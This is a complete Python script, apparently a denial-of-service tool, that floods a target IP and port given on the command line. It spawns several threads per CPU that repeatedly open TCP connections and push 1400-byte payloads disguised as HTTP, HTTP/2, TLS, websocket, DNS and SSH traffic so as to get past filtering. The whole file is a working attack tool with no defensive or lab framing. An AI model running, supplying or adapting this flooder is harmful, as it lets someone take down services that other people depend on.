import socket
import random
import sys
import time
import threading
import os
import select

class TCPBypassFlood:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.bypass_payloads = self.generate_bypass_payloads()
        
    def generate_bypass_payloads(self):
        payloads = []
        
        http_base = [
            f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {self.target_ip}\r\nContent-Length: 0\r\n\r\n",
        ]
        
        http2_preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
        tls_hello = b'\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03' + os.urandom(32)
        websocket = b'GET /chat HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n'
        dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
        ssh_banner = b'SSH-2.0-OpenSSH_8.9p1\r\n'
        
        for http in http_base:
            payloads.append(http.encode() + os.urandom(1400 - len(http)))
        
        for proto in [http2_preface, tls_hello, websocket, dns_query, ssh_banner]:
            payloads.append(proto + os.urandom(1400 - len(proto)))
        
        for _ in range(50):
            payloads.append(os.urandom(1400))
        
        return payloads
    
    def get_cpu_count(self):
        try:
            return os.cpu_count() * 4
        except:
            return 16
    
    def tcp_worker(self, worker_id):
        end = time.time() + self.duration
        dst = (self.target_ip, self.target_port)
        
        local = []
        for i in range(10):
            local.append(random.choice(self.bypass_payloads))
        
        while time.time() < end and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setblocking(False)
                
                try:
                    sock.connect(dst)
                except BlockingIOError:
                    pass
                
                _, ready, _ = select.select([], [sock], [], 0.001)
                
                if ready:
                    p = local[worker_id % 10]
                    while time.time() < end:
                        try:
                            sock.send(p)
                        except:
                            break
                
                sock.close()
            except:
                continue
    
    def start(self):
        threads = []
        n = self.get_cpu_count()
        
        for i in range(n):
            t = threading.Thread(target=self.tcp_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(self.duration)
        self.running = False

def main():
    if len(sys.argv) != 4:
        sys.exit(1)
    
    f = TCPBypassFlood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
    f.start()

if __name__ == "__main__":
    main()
